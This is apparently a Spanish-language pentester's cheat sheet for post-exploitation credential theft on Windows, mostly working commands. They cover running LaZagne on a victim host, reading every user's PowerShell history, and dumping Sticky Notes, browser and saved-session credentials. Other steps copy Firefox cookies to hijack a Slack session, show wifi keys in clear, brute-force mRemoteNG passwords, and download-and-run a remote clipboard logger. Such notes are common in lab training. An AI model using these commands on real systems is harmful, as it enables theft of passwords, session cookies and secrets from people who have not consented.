Como primer herramienta podemos buscar (si estamos por rdp) podemos usar el buscador de windows con las siguientes palabras, talvez aparezcan ficheros con contraseñas guardadas:

- Passwords	
- Passphrases	
- Keys
- Username	
- User account	
- Creds
- Users	
- Passkeys	
- Passphrases
- configuration	
- dbcredential	
- dbpassword
- pwd	
- Login	
- Credentials

Lo siguiente que podemos hacer es unsar lazagne 

https://github.com/AlessandroZ/LaZagne/releases/

Una vez que lo metimos en la pc victima lo corremos con:

    start lazagne.exe all

#### también podemos usar el findr por cmd:

    findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

#### Powershell History

    gc (Get-PSReadLineOption).HistorySavePath

#### Podemos también en un oneliner recorrer todos los archivos historicos de powershell a los que tenemos acceso

    foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}

#### El archivo unnatend.xml puede tener contraseñas también

#### Buscar archivos en base a una palabra:

    findstr /spin "password" *.* 

#### Buscar con powershell
    select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password

#### BUscar una palabra en base a una extensión:
    dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*

#### Extraer contraseñas de sticky notes
Las sticky notes (aunque no lo demuesten) son una base de datos.

Esta base de datos se encuentra en:

C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite

Podemos acceder a ella y luego robarla para cargarla en nuestra pc atacante o dumpearla con powershell mediante PSSQLite.
##### Powershell local
- Import-Module .\PSSQLite.psd1
- $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
- Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap

##### Linux:
- Robamos el archivo
- Corremos con strings

#### Cmdkey saved credentials
Podemos listar las keys guardadas en el cmd. En un entorno de AD podríamos llegar a encontrar contraseñas guardadas que nos permitan acceder a otros recursos con su ruta incluída.

        cmdkey /list

También podemos correr cosas como el usuario si tiene las creds guardadas en el cmd

        runas /savecred /user:inlanefreight\bob "COMMAND HERE"

#### Extraer credenciales de los browsers:
Podemos usar herramientas como sharpchrome para lograrlo

        .\SharpChrome.exe logins /unprotect

#### También traer contraseñas de chrome:

    gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password

#### Extraer contraseñas de firefox
Firefox guarda sus contraseñas en una sqlite

##### Robamos la sqlite de la victima
    copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
##### En la pc atacante:
    python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d

    
#### Extraer credenciales de Putty, Winscp, Filezilla, SuperPutty y RDP
para esto podemos usar SessionGopher

        Import-Module .\SessionGopher.ps1
        
        Invoke-SessionGopher -Target <Domain>

#### Clear-text passwords en el registro
        HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon

#### Contraseñas de wifi

##### 1) listamos las redes
        netsh wlan show profile
##### 2) Dumpeamos los datos
        netsh wlan show profile <red> key=clear

### mRemteNG
- mRemoteNG es un software que permite conectarse con sistemas remotos mediante VNC,RDP, SSH y otros.
- Guarda las credenciales en el archivo confCons.xml
- su contraseña por defecto es mR3m
- La ubicación de confCons.xml es <user>\appdata\roaming\mremoteng
  #### Desencriptar un password de mremoteng con la contraseña por default
      python3 mremoteng_decrypt.py -s "<password>"
  #### Desencriptar un mremoteng con custom password
      for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "<pass>" -p $password 2>/dev/null;done

### Obtener el clipboard
    IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
    Invoke-ClipboardLogger

---

### Obtener credenciales de AWS

Cuando realizamos una autenticación en AWS utilizando el cli o el sdk se enera un conjunto de credenciales que incluyen un Access Key Id y un Secret Access Key. Suele uardarse en:

    C:\Users\NombreDeUsuario\.aws\credentials

### Buscar bases de datos de keepass

    Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

### Buscar informacipon sensible de servidores XAMPP

    Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

